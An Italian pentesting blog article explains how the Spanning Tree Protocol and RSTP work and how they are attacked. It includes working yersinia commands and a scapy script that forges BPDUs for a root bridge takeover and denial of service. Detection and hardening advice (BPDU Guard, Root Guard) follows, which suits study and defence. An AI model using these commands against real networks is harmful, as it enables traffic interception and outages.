---
title: 'STP e RSTP sotto attacco: Root Bridge, BPDU e takeover di rete'
slug: stp
description: 'Scopri come funzionano STP e RSTP, cos’è il Root Bridge,Spanning Tree Protocol e come avviene l’elezione tramite BPDU e quali rischi reali esistono in pentest: takeover, TCN flood e attacchi layer 2.'
image: /stp.webp
draft: true
date: 2026-03-27T00:00:00.000Z
categories:
  - networking
subcategories:
  - protocolli
tags:
  - bpdu-guard
  - root-bridge-takeover
---

STP è il protocollo che impedisce i loop nelle reti switched. Capire cos'è STP e come funziona è essenziale per un pentester: chi controlla il root bridge controlla il flusso del traffico di tutta la rete. Gli attacchi STP sono silenziosi, devastanti, e presenti in qualsiasi rete con switch managed — il che significa praticamente ovunque.

***

## Cos'è STP

STP (Spanning Tree Protocol) è uno standard IEEE definito nella specifica **802.1D**. È un protocollo di livello 2 progettato per prevenire i loop in reti con percorsi ridondanti tra switch.

Il problema che risolve è semplice da capire: in una rete con percorsi multipli tra switch, un frame broadcast potrebbe girare in loop all'infinito, saturando la banda e mandando in crash l'intera infrastruttura in pochi secondi. STP risolve questo disabilitando logicamente i percorsi ridondanti, mantenendoli però disponibili come backup.

**RSTP (Rapid Spanning Tree Protocol)**, definito in **802.1w** e poi incorporato in 802.1D-2004, è l'evoluzione moderna: converge molto più velocemente di STP (millisecondi invece di 30-50 secondi), pur mantenendo la stessa logica di base.

Varianti rilevanti:

* **PVST+ (Per-VLAN Spanning Tree Plus):** implementazione Cisco, un'istanza STP per ogni VLAN
* **MSTP (Multiple Spanning Tree Protocol, 802.1s):** raggruppa VLAN in istanze STP, più scalabile in ambienti grandi
* **Rapid PVST+:** versione Cisco di RSTP per ogni VLAN

***

## Come funziona STP

### L'elezione del Root Bridge

STP funziona eleggendo un **Root Bridge**: lo switch che diventa la radice dell'albero logico della rete. Tutti i percorsi attivi convergono verso il Root Bridge.

L'elezione avviene tramite **BPDU (Bridge Protocol Data Unit)**, frame speciali che gli switch si scambiano continuamente. Vince lo switch con il **Bridge ID** più basso:

```
Bridge ID = Priority (2 byte) + MAC Address (6 byte)
```

La priority di default è **32768** su quasi tutti i vendor. Se due switch hanno la stessa priority, vince quello con il MAC address più basso.

### BPDU: il messaggio di STP

Le BPDU vengono inviate all'indirizzo multicast `01:80:C2:00:00:00` ogni 2 secondi (Hello Time di default). Contengono:

* Bridge ID del mittente
* Root Bridge ID corrente
* Costo del percorso verso il Root Bridge
* Porta e Bridge ID del mittente
* Timers (Hello, Forward Delay, Max Age)

### Ruoli delle porte STP

Dopo l'elezione del Root Bridge, ogni porta assume un ruolo:

| Ruolo           | Descrizione                                                                                     |
| --------------- | ----------------------------------------------------------------------------------------------- |
| Root Port       | La porta con il percorso a costo minore verso il Root Bridge. Una per switch (escluso il Root). |
| Designated Port | La porta che forwarda traffico verso un segmento. Una per segmento.                             |
| Blocked Port    | Porta disabilitata per prevenire loop. Riceve BPDU ma non forwarda traffico.                    |

### Stati delle porte STP (classico)

In STP classico (802.1D), una porta attraversa questi stati:

1. **Blocking** — riceve BPDU, non forwarda
2. **Listening** — partecipa all'elezione
3. **Learning** — impara i MAC address, non forwarda ancora
4. **Forwarding** — operativa
5. **Disabled** — amministrativamente disabilitata

La transizione da Blocking a Forwarding richiede 30-50 secondi in STP classico. RSTP riduce questo a pochi secondi introducendo nuovi meccanismi di negoziazione (Proposal/Agreement).

### Path Cost

Il costo del percorso verso il Root Bridge dipende dalla velocità dei link:

| Velocità | Cost (802.1D-1998) | Cost (802.1t) |
| -------- | ------------------ | ------------- |
| 10 Mbps  | 100                | 2.000.000     |
| 100 Mbps | 19                 | 200.000       |
| 1 Gbps   | 4                  | 20.000        |
| 10 Gbps  | 2                  | 2.000         |

***

## Dove viene usato STP nelle reti

STP è attivo di default su praticamente tutti gli switch managed del mercato:

* **LAN aziendali:** qualsiasi rete con ridondanza fisica tra switch usa STP o RSTP
* **Datacenter:** MSTP o Rapid PVST+ per gestire topologie complesse con molte VLAN
* **Reti campus:** gerarchie di switch core/distribution/access tutte governate da STP
* **Reti industriali OT:** switch industriali spesso con STP attivo e configurazione di default non modificata

Un aspetto critico: STP è attivo anche sulle porte di accesso utente, il che significa che un host connesso a una porta di accesso può inviare BPDU e influenzare la topologia STP — se non è configurato PortFast e BPDU Guard.

***

## Perché STP è importante in cybersecurity

STP è un protocollo **senza autenticazione**. Qualsiasi switch o host può inviare BPDU e partecipare — o interferire — con l'elezione del Root Bridge e la topologia dell'albero.

Un attaccante che diventa Root Bridge controlla quali percorsi sono attivi e quali sono bloccati. Questo si traduce in:

* **Intercettazione massiva del traffico:** ridirigendo il flusso attraverso se stesso
* **Denial of Service:** destabilizzando la topologia e causando riconvergenze continue
* **Mappatura precisa della topologia fisica:** le BPDU rivelano la struttura della rete

Conoscere STP significa capire uno dei meccanismi fondamentali che regola il traffico a livello 2. Per il contesto delle VLAN su cui opera STP, vedi [VLAN e 802.1Q](https://hackita.it/articoli/vlan). Per il livello fisico, leggi [Ethernet IEEE 802.3](https://hackita.it/articoli/ethernet-ieee-802-3).

***

## STP in un engagement di pentesting

### Reconnaissance passiva con BPDU

Le BPDU vengono inviate ogni 2 secondi all'indirizzo multicast `01:80:C2:00:00:00`. Ascoltarle è completamente passivo e rivela immediatamente:

* **Chi è il Root Bridge:** il suo Bridge ID e MAC address
* **La topologia logica:** struttura dell'albero STP
* **Il vendor degli switch:** tramite MAC address OUI nelle BPDU
* **La configurazione dei timer:** indica se è STP classico o RSTP
* **Quale istanza PVST+ è attiva:** rivela le VLAN presenti nella rete

```bash
tcpdump -i eth0 -nn ether dst 01:80:c2:00:00:00
```

In Wireshark:

```
stp
```

### Enumeration con yersinia

**yersinia** permette di analizzare e interagire con STP in modo strutturato:

```bash
yersinia stp -interface eth0
```

In modalità interattiva, mostra il Root Bridge corrente, le BPDU ricevute, e permette di lanciare attacchi specifici.

### Attack surface: Root Bridge takeover

L'attacco principale su STP è diventare Root Bridge. Il processo è semplice: inviare BPDU con un Bridge ID inferiore a quello del Root corrente.

Con yersinia:

```bash
yersinia stp -attack 4 -interface eth0
# Attack 4: claiming root role
```

Con scapy, costruendo BPDU custom con priority 0:

```python
from scapy.all import *

bpdu = Ether(dst="01:80:c2:00:00:00", src="aa:bb:cc:dd:ee:ff") / \
       LLC(dsap=0x42, ssap=0x42, ctrl=3) / \
       STP(bpddst="01:80:c2:00:00:00",
           bridgeid=0,
           bridgemac="aa:bb:cc:dd:ee:ff")

sendp(bpdu, iface="eth0", loop=1, inter=2)
```

Una volta diventato Root Bridge, tutto il traffico che prima passava per percorsi diversi viene rediretto attraverso l'attaccante per raggiungere il nuovo "centro" della topologia.

### Pivoting tramite manipolazione STP

Diventare Root Bridge in un segmento specifico permette di intercettare il traffico inter-switch senza usare ARP spoofing — rendendo l'attacco meno rumoroso e più difficile da rilevare con tool tradizionali come arpwatch. Combinato con tecniche di [sniffing](https://hackita.it/articoli/sniffing) e [man-in-the-middle](https://hackita.it/articoli/man-in-the-middle), dà visibilità sul traffico di interi segmenti di rete.

***

## Attacchi e abusi possibili su STP

### Root Bridge Takeover

Come descritto: inviare BPDU con priority 0 per diventare il Root Bridge. Causa una riconvergenza STP che redirige il traffico attraverso l'attaccante. Rilevabile ma spesso non monitorato.

### STP Denial of Service (TCN flood)

Inviare continuamente **TCN (Topology Change Notification)** BPDU forza tutti gli switch a svuotare le proprie CAM table periodicamente. Gli switch tornano in modalità flood per ogni MAC non presente in tabella, saturando la rete con traffico broadcast e degradando le performance.

```bash
yersinia stp -attack 2 -interface eth0
# Attack 2: sending conf BPDU
```

### BPDU Flooding

Inviare una quantità massiva di BPDU diverse forza riconvergenze STP continue. La rete diventa instabile, con porte che passano continuamente da Forwarding a Blocking. Causa interruzioni del servizio proporzionali alla frequenza del flood.

### Topology Manipulation

Inviare BPDU che manipolano i costi dei percorsi può forzare il traffico di segmenti specifici attraverso percorsi controllati dall'attaccante, senza necessariamente diventare Root Bridge.

***

## Esempi pratici con STP/RSTP in laboratorio

### Identificare il Root Bridge corrente

Con Wireshark, cattura le BPDU e cerca il frame con Root Bridge Identifier uguale a Bridge Identifier: quello è il Root Bridge.

Oppure con tcpdump e parsing manuale:

```bash
tcpdump -i eth0 -nn -e ether dst 01:80:c2:00:00:00 -A | head -60
```

### Analisi BPDU con tshark

```bash
tshark -i eth0 -f "ether dst 01:80:c2:00:00:00" -T fields \
  -e stp.root.hw \
  -e stp.root.cost \
  -e stp.bridge.hw
```

Output diretto: MAC del Root Bridge, costo del percorso, MAC del bridge mittente.

### Verifica degli attacchi con yersinia in modalità grafica

```bash
yersinia -G
```

Interfaccia grafica che mostra in tempo reale le BPDU ricevute e permette di selezionare il tipo di attacco STP con un click.

***

## Detection e difesa STP/RSTP

Un difensore che monitora STP può rilevare:

* **Variazioni improvvise del Root Bridge:** cambio del Bridge ID o MAC del Root è quasi sempre anomalo in una rete stabile
* **Aumento delle TCN:** topologia change notification in eccesso indicano destabilizzazione
* **BPDU da porte di accesso:** le workstation non dovrebbero mai inviare BPDU
* **Riconvergenze STP frequenti:** indicatore di attacco o misconfiguration grave
* **Bridge ID con priority 0:** nessun switch legittimo usa priority 0 in produzione

Tool: syslog dagli switch con logging STP abilitato, **Zeek** con script di analisi BPDU, SNMP trap per topology change.

***

## Hardening e mitigazioni STP

### PortFast

Abilita PortFast su tutte le porte di accesso utente. Le porte PortFast saltano gli stati Listening e Learning, passando direttamente a Forwarding. Non partecipano alla topologia STP ma non possono diventare Designated Port.

```
interface GigabitEthernet1/0/1
 spanning-tree portfast
```

### BPDU Guard

BPDU Guard disabilita automaticamente una porta se riceve una BPDU. Applicato sulle porte PortFast, impedisce a qualsiasi dispositivo connesso di influenzare STP:

```
interface GigabitEthernet1/0/1
 spanning-tree portfast
 spanning-tree bpduguard enable
```

Oppure globalmente:

```
spanning-tree portfast bpduguard default
```

### BPDU Filter

Alternativa a BPDU Guard: blocca l'invio e la ricezione di BPDU sulla porta senza disabilitarla. Attenzione: se usato su trunk port può causare loop.

### Root Guard

Root Guard impedisce che una porta diventi Root Port, proteggendo il Root Bridge corrente da tentativi di takeover:

```
interface GigabitEthernet1/0/24
 spanning-tree guard root
```

Se riceve una BPDU con Bridge ID inferiore al Root corrente, mette la porta in stato **root-inconsistent** (blocca il traffico) senza disabilitarla fisicamente.

### Configurare manualmente il Root Bridge

Non lasciare l'elezione al caso. Configura esplicitamente il Root Bridge primario e secondario:

```
spanning-tree vlan 10 priority 4096
spanning-tree vlan 10 priority 8192  ! su switch secondario
```

Priority valide: multipli di 4096 (0, 4096, 8192, ..., 61440). Più bassa = più probabile diventare Root.

### Usare RSTP invece di STP classico

RSTP converge in millisecondi invece di 30-50 secondi. Riduce la finestra di vulnerabilità durante le riconvergenze e risponde più velocemente ad anomalie. Quasi tutti gli switch moderni lo supportano.

```
spanning-tree mode rapid-pvst
```

***

## Errori comuni su STP

**"STP è configurato automaticamente, non c'è niente da fare"**
Falso. La configurazione automatica significa che il Root Bridge viene eletto in base al MAC address più basso — spesso uno switch di accesso vecchio, non lo switch core. Questo è già un problema di sicurezza e performance.

**"BPDU Guard e PortFast fanno la stessa cosa"**
No. PortFast modifica il comportamento della porta nel processo STP. BPDU Guard reagisce all'eventuale ricezione di BPDU disabilitando la porta. Servono entrambi, sulle stesse porte di accesso.

**"Diventare Root Bridge è complesso e richiede hardware speciale"**
Falso. Basta inviare BPDU con priority 0 da qualsiasi PC Linux. yersinia o Scapy sono sufficienti.

**"RSTP è immune agli attacchi STP"**
No. RSTP converge più velocemente, ma usa lo stesso meccanismo di elezione basato su Bridge ID senza autenticazione. Gli attacchi di Root Bridge takeover e TCN flood funzionano anche su RSTP.

***

## FAQ su STP/RSTP

**Cos'è STP e a cosa serve?**
STP (Spanning Tree Protocol) è un protocollo di livello 2 che previene i loop nelle reti switched con percorsi ridondanti. Disabilita logicamente i percorsi in eccesso, mantenendoli disponibili come backup in caso di guasto.

**Cos'è il Root Bridge e come viene eletto?**
Il Root Bridge è lo switch che funge da radice dell'albero logico STP. Viene eletto automaticamente in base al Bridge ID più basso: Priority (default 32768) + MAC address. Chi ha la priority più bassa vince; a parità, vince il MAC più basso.

**Qual è la differenza tra STP e RSTP?**
RSTP (Rapid Spanning Tree Protocol) è l'evoluzione di STP. Converge in millisecondi invece di 30-50 secondi grazie a nuovi meccanismi di negoziazione (Proposal/Agreement). La logica di elezione del Root Bridge è identica.

**Come si protegge uno switch da un attacco di Root Bridge takeover?**
Le difese principali sono Root Guard (impedisce che una porta diventi Root Port) e BPDU Guard (disabilita le porte di accesso se ricevono BPDU). Configurare esplicitamente la priority del Root Bridge desiderato aggiunge un ulteriore livello di protezione.

**STP funziona su reti con VLAN?**
Dipende dall'implementazione. STP classico ha un'unica istanza per tutta la rete. PVST+ (Cisco) ha un'istanza per ogni VLAN. MSTP raggruppa VLAN in istanze. In ambienti con molte VLAN, PVST+ o MSTP sono la norma.

***

## Conclusione su STP/RSTP

STP è uno di quei protocolli che vengono configurati una volta e poi dimenticati. Questo è esattamente il problema: una rete con STP non monitorato è una rete dove chiunque con accesso fisico a una porta può ridisegnare la topologia di livello 2.

Root Bridge takeover, TCN flood, BPDU manipulation: sono attacchi reali, silenziosi, e spesso completamente invisibili ai sistemi di detection che non monitorano specificamente il traffico STP.

BPDU Guard, Root Guard, configurazione esplicita del Root Bridge: tre misure semplici che chiudono la maggior parte della superficie di attacco. Tre misure che nella maggior parte delle reti enterprise non sono implementate.

Approfondisci i protocolli e le tecniche correlate:

* [Ethernet IEEE 802.3: frame e livello datalink](https://hackita.it/articoli/ethernet-ieee-802-3)
* [VLAN e 802.1Q: segmentazione e hopping](https://hackita.it/articoli/vlan)
* [LLDP: discovery passivo dell'infrastruttura](https://hackita.it/articoli/lldp-link-layer-discovery-protocol)
* [ARP: spoofing e cache poisoning](https://hackita.it/articoli/arp)
* [Sniffing su reti locali](https://hackita.it/articoli/sniffing)
* [Man in the Middle: tecniche e tool](https://hackita.it/articoli/man-in-the-middle)
* [Nmap: reconnaissance e port scanning](https://hackita.it/articoli/nmap)

Riferimento ufficiale: [IEEE 802.1D — MAC Bridges and Virtual Bridged Local Area Networks](https://standards.ieee.org/ieee/802.1D/3387/)

***

Hai trovato misconfigurazioni STP nella tua infrastruttura o vuoi un assessment completo della sicurezza a livello 2?
Scopri i servizi di penetration testing su [hackita.it/servizi](https://hackita.it/servizi).

Contenuti come questo richiedono tempo e ricerca. Se HackITA ti è utile:
[hackita.it/supporto](https://hackita.it/supporto)
